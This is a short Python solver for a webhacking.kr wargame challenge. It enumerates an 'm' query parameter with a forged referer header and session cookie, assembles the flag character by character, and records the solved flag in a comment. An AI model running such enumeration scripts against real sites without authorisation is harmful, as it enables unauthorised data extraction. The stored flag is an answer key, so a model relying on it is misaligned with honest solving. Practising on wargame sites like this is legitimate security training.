import requests
from phpsessid import cookies

url = 'https://webhacking.kr/challenge/bonus-14/?m='
headers={'referer': 'https://webhacking.kr/challenge/bonus-14/?m='}

flag = ''
for i in range(39):
    response = requests.get(url+str(i), headers=headers, cookies=cookies)
    flag += response.text[0]
    print(flag)

# FLAG{a7981201c48d0ece288afd01ca43c55b}

